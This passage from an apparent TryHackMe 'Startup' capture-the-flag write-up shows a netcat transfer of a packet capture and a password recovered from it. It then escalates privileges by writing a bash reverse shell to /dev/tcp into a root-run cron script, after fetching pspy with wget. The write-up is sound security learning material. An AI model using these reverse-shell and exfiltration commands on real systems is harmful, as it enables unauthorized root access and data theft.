-dr-xr-xr-x  13 root     root        0 Nov 21 11:31 sys
-drwxrwxrwt   7 root     root     4.0K Nov 21 11:31 tmp
-drwxr-xr-x  10 root     root     4.0K Sep 25 08:09 usr
-drwxr-xr-x   2 root     root     4.0K Nov 12 04:50 vagrant
-drwxr-xr-x  14 root     root     4.0K Nov 12 04:52 var
-lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-190-generic
-lrwxrwxrwx   1 root     root       30 Sep 25 08:12 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-190-generic
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As www-data we own a folder and a txt file. I checked the incidents folder and found a pcapng file, I used netcat to transfer the file to my machine so I could review in Wireshark.&lt;/p&gt;
-
-&lt;p&gt;On my machine:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌──[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $nc -nvlp 8080 &amp;gt; catch.pcapng
-listening on [any] 8080 ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Back on Startup:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cd incidents
-$ ls
-suspicious.pcapng
-$ nc [VPN IP] 8080 &amp;lt; suspicious.pcapng
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Opening the file in Wireshark allows us to review the packet capture and review the captured incident.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/startup/wireshark.png&quot; alt=&quot;wireshark&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Scanning through it appears someone has completed the same steps I have by uploading a web shell and navigating to the directory via port 80 and executed the reverse shell. After the GET request I can see TCP packets on port 4444. Right click on one of the packets and select Follow &amp;gt; TCP Stream. This will show the entire TCP stream and all the commands and responses between the attacker and the server.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ ls
-bin
-boot
-data
-dev
-etc
-home
-incidents
-initrd.img
-initrd.img.old
-lib
-lib64
-lost+found
-media
-mnt
-opt
-proc
-recipe.txt
-root
-run
-sbin
-snap
-srv
-sys
-tmp
-usr
-vagrant
-var
-vmlinuz
-vmlinuz.old
-$ ls -la
-total 96
-drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
-drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
-drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
-drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
-drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
-drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
-drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
-drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
-drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
-lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -&amp;gt; boot/initrd.img-4.4.0-190-generic
-lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-190-generic
-drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
-drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
-drwx------   2 root     root     16384 Sep 25 08:12 lost+found
-drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
-drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
-drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
-dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
--rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
-drwx------   3 root     root      4096 Oct  2 17:24 root
-drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
-drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
-drwxr-xr-x   2 root     root      4096 Oct  2 17:20 snap
-drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
-dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
-drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
-drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
-drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
-drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
-lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-190-generic
-lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-190-generic
-$ whoami
-www-data
-$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
-www-data@startup:/$ cd
-cd
-bash: cd: HOME not set
-www-data@startup:/$ ls
-ls
-bin   etc	  initrd.img.old  media  recipe.txt  snap  usr	    vmlinuz.old
-boot  home	  lib		  mnt	 root	     srv   vagrant
-data  incidents   lib64		  opt	 run	     sys   var
-dev   initrd.img  lost+found	  proc	 sbin	     tmp   vmlinuz
-www-data@startup:/$ cd home
-cd home
-www-data@startup:/home$ cd lennie
-cd lennie
-bash: cd: lennie: Permission denied
-www-data@startup:/home$ ls
-ls
-lennie
-www-data@startup:/home$ cd lennie
-cd lennie
-bash: cd: lennie: Permission denied
-www-data@startup:/home$ sudo -l
-sudo -l
-[sudo] password for www-data: [redacted]]
-
-Sorry, try again.
-[sudo] password for www-data: 
-
-Sorry, try again.
-[sudo] password for www-data: [redacted]]
-
-sudo: 3 incorrect password attempts
-www-data@startup:/home$ cat /etc/passwd
-cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-syslog:x:104:108::/home/syslog:/bin/false
-_apt:x:105:65534::/nonexistent:/bin/false
-lxd:x:106:65534::/var/lib/lxd/:/bin/false
-messagebus:x:107:111::/var/run/dbus:/bin/false
-uuidd:x:108:112::/run/uuidd:/bin/false
-dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
-pollinate:x:111:1::/var/cache/pollinate:/bin/false
-vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
-ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
-lennie:x:1002:1002::/home/lennie:
-ftpsecure:x:1003:1003::/home/ftpsecure:
-www-data@startup:/home$ exit
-exit
-exit
-$ exit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I have redacted the output to hide the password however its clearly visible in the output in the Wireshark capture. Im going to assume the user has not changed their password and try to login in using SSH with the capture credentials.&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;SSH works as expected as the user ‘lennie’. Logging in I can now grab the first flag user.txt.&lt;/p&gt;
-
-&lt;p&gt;To complete this room we need to escalate our privileges to root to grab the final flag. In the users home directly are two folders ‘Documents’ and ‘scripts’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $ssh lennie@startup
-lennie@startup's password: 
-Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-44 packages can be updated.
-30 updates are security updates.
-
-
-Last login: Sat Nov 21 12:01:37 2020 from (VPN IP)
-$ bash
-lennie@startup:~$ ls -alh
-total 24K
-drwx------ 5 lennie lennie 4.0K Nov 21 12:01 .
-drwxr-xr-x 3 root   root   4.0K Nov 12 04:53 ..
-drwx------ 2 lennie lennie 4.0K Nov 21 12:01 .cache
-drwxr-xr-x 2 lennie lennie 4.0K Nov 12 04:53 Documents
-drwxr-xr-x 2 root   root   4.0K Nov 12 04:54 scripts
--rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt
-lennie@startup:~$ cd Documents/
-lennie@startup:~/Documents$ ls -lah
-total 20K
-drwxr-xr-x 2 lennie lennie 4.0K Nov 12 04:53 .
-drwx------ 5 lennie lennie 4.0K Nov 21 12:01 ..
--rw-r--r-- 1 root   root    139 Nov 12 04:53 concern.txt
--rw-r--r-- 1 root   root     47 Nov 12 04:53 list.txt
--rw-r--r-- 1 root   root    101 Nov 12 04:53 note.txt
-lennie@startup:~/Documents$ cat concern.txt 
-I got banned from your library for moving the &quot;C programming language&quot; book into the horror section. Is there a way I can appeal? --Lennie
-lennie@startup:~/Documents$ cat list.txt 
-Shoppinglist: Cyberpunk 2077 | Milk | Dog food
-lennie@startup:~/Documents$ cat note.txt 
-Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
-lennie@startup:~/Documents$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nothing to important and this stage so I looked at scripts.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/Documents$ cd ..
-lennie@startup:~$ cd scripts/
-lennie@startup:~/scripts$ ls -lag
-total 16
-drwxr-xr-x 2 root   4096 Nov 12 04:54 .
-drwx------ 5 lennie 4096 Nov 21 12:01 ..
--rwxr-xr-x 1 root     77 Nov 12 04:53 planner.sh
--rw-r--r-- 1 root      1 Nov 21 12:07 startup_list.txt
-lennie@startup:~/scripts$ ls -lah
-total 16K
-drwxr-xr-x 2 root   root   4.0K Nov 12 04:54 .
-drwx------ 5 lennie lennie 4.0K Nov 21 12:01 ..
--rwxr-xr-x 1 root   root     77 Nov 12 04:53 planner.sh
--rw-r--r-- 1 root   root      1 Nov 21 12:07 startup_list.txt
-lennie@startup:~/scripts$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Two files both owned by root.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cat startup_list.txt 
-
-lennie@startup:~/scripts$ cat planner.sh 
-#!/bin/bash
-echo $LIST &amp;gt; /home/lennie/scripts/startup_list.txt
-/etc/print.sh
-lennie@startup:~/scripts$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It appears the planner.sh bash script echos the LIST variable to the startup_list.txt file, however the file is currently blank. Then it runs the script found at /etc/print.sh&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cat /etc/print.sh
-#!/bin/bash
-echo &quot;Done!&quot;
-lennie@startup:~/scripts$ ls -lah /etc/print.sh
--rwx------ 1 lennie lennie 25 Nov 12 04:53 /etc/print.sh
-lennie@startup:~/scripts$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/etc/print.sh simply echos “Done!” however the user Lennie owns this file so we can edit the script and make it do what we want. Before I do that though I need to be sure that root will run the script regularly. To do that I use a tool called &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;I use python3 to start a quick http server: &lt;em&gt;sudo python3 -m http.server 80&lt;/em&gt;. On the Startup machine I download pspy and execute.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cd /dev/shm
-lennie@startup:/dev/shm$ wget http://(VPN IP)/pspy64
---2020-11-21 12:13:38--  http://(VPN IP)/pspy64
-Connecting to (VPN IP):80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3078592 (2.9M) [application/octet-stream]
-Saving to: ‘pspy64’
-
-pspy64                                      100%[=========================================================================================&amp;gt;]   2.94M  1.60MB/s    in 1.8s
-
-2020-11-21 12:13:40 (1.60 MB/s) - ‘pspy64’ saved [3078592/3078592]
-
-lennie@startup:/dev/shm$ chmod +x pspy64 
-lennie@startup:/dev/shm$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;pspy will now show all the processes running and the users associated.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/startup/pspy.png&quot; alt=&quot;pspy&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;root is running the script regularly, I can determine its root as the UID is 0.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cat /etc/print.sh
-#!/bin/bash
-echo &quot;Done!&quot;
-bash -i &amp;gt;&amp;amp; /dev/tcp/(VPN IP)/8888 0&amp;gt;&amp;amp;1
-lennie@startup:~/scripts$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I edit the print.sh script with a bash reverse shell one liner and wait for the script to execute.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
-└──╼ $nc -nvlp 8888
-listening on [any] 8888 ...
-connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 34830
-bash: cannot set terminal process group (2212): Inappropriate ioctl for device
-bash: no job control in this shell
-root@startup:~# cd /root
-cd /root
-root@startup:~# ls -lah
-ls -lah
-total 28K
-drwx------  4 root root 4.0K Nov 12 04:54 .
-drwxr-xr-x 25 root root 4.0K Nov 21 10:58 ..
--rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
-drwxr-xr-x  2 root root 4.0K Nov 12 04:54 .nano
--rw-r--r--  1 root root  148 Aug 17  2015 .profile
--rw-r--r--  1 root root   38 Nov 12 04:53 root.txt
-drwx------  2 root root 4.0K Nov 12 04:50 .ssh
-root@startup:~# 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Wait a few seconds and root shell! I really enjoyed this room, particularly the Wireshark element reviewing the capture to locate credentials.&lt;/p&gt;
-
-&lt;h3 id=&quot;secret-ingredient&quot;&gt;Secret ingredient&lt;/h3&gt;
-
-&lt;p&gt;I still need to find the secret ingredient from the recipe! This can be found at /recipe.txt&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cat recipe.txt
-Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was [redacted].
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
 
       
       
